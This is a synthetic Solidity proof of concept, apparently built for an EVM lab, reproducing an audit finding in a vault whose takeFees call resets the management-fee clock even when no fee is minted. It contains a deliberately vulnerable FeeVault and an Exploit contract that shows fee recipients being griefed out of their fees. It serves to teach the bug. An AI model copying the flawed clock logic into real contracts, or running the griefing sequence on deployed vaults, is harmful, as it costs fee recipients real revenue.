// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  VaultCraft — takeFees advances feesUpdatedAt when share value is flat
    (Zokyo, finding #45888)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the management-fee clock is stored on every takeFees call.
    A flat share value mints nothing, but the next accrual then sees dt = 0. */

contract FeeVault {
    uint256 public constant YEAR = 31557600;
    uint256 public totalAssets;
    uint256 public totalSupply;
    uint256 public highWaterMark;
    uint64 public feesUpdatedAt;
    uint256 public feeMinted;
    mapping(address => uint256) public balanceOf;
    address public constant FEE_RECIPIENT = address(0xFEEE);

    constructor() {
        totalAssets = YEAR * 1000 ether;
        totalSupply = totalAssets;
        highWaterMark = totalAssets;
        balanceOf[address(0xBEEF)] = totalSupply;
    }

    function shareValue() public view returns (uint256) {
        return totalAssets;
    }

    function managementAssets() public view returns (uint256) {
        uint256 managementFee = 1e18;
        uint256 dt = block.timestamp - feesUpdatedAt;
        return managementFee * (totalAssets * dt) / YEAR / 1e18;
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        return assets * totalSupply / totalAssets;
    }

    function accrueYield() external {
        totalAssets += 1 ether;
    }

    function takeFees() external returns (uint256 fee) {
        uint256 valueNow = shareValue();
        fee = valueNow > highWaterMark ? managementAssets() : 0;
        if (valueNow > highWaterMark) highWaterMark = valueNow;
        if (fee > 0) {
            uint256 shares = fee;
            totalSupply += shares;
            balanceOf[FEE_RECIPIENT] += shares;
            feeMinted += shares;
        }
        feesUpdatedAt = uint64(block.timestamp); // @> VULN: clock moves even when share value did not and no fee was minted
        // FIX: if (fee == 0) return; do not write feesUpdatedAt
    }
}

contract Exploit {
    FeeVault public grief;
    FeeVault public control;
    uint256 public griefFee;
    uint256 public controlFee;

    constructor() {
        grief = new FeeVault();
        control = new FeeVault();
    }

    function run() external {
        uint256 flat = grief.takeFees();
        grief.accrueYield();
        uint256 secondFee = grief.takeFees();
        control.accrueYield();
        uint256 honest = control.takeFees();
        griefFee = grief.feeMinted();
        controlFee = control.feeMinted();
        require(flat == 0, "flat minted");
        require(secondFee == 0 && griefFee == 0, "grief still zero");
        require(honest > 1000 ether && controlFee == honest, "control fee");
        require(grief.feesUpdatedAt() == uint64(block.timestamp), "clock moved");
    }
}
